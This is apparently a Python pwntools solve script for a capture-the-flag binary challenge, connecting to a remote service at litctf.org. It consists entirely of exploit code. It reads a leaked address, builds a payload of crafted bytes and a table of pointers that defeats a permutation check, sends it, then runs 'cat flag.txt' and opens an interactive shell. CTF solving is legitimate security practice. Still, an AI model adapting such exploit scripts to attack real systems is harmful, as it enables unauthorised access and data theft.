from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("litctf.org", 31780)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))
p_vuln = 0x4040
p_ptr = 0x4060
p_a = 0x4120

io.recvuntil(" = ", drop=True)
a = int(io.recv(14), 16)
log.success("a :-----> " + hex(a))
payload = b""
p_vuln = a - 0xe0

str="12301231023120312130213201321032"
arr=["0123","0132","0213","0231","0312",
"1023","1032","1203","1230","1302","1320",
"2013","2031","2103","2130","2301","2310",
"3012","3021","3102","3120","3201","3210"]
addr = []
for i in range(23):
    # log.success(arr[i])
    idx = str.index(arr[i])
    addr.append(idx)
    log.success(hex(p_vuln+idx))

# payload = str.encode("ascii")
byte_data = b''.join(p8(int(char)) for char in str)
payload = byte_data
ptrs = b""
log.success(hex(p_vuln))
for i in range(23):
    ptrs += p64(p_vuln + addr[i])

payload += ptrs

payload += p64(a)
payload += b"\x00\x03\x02\x01"

ddebug("break is_permutation\n continue")
io.send(payload)


io.sendline(b"cat flag.txt")
io.interactive()

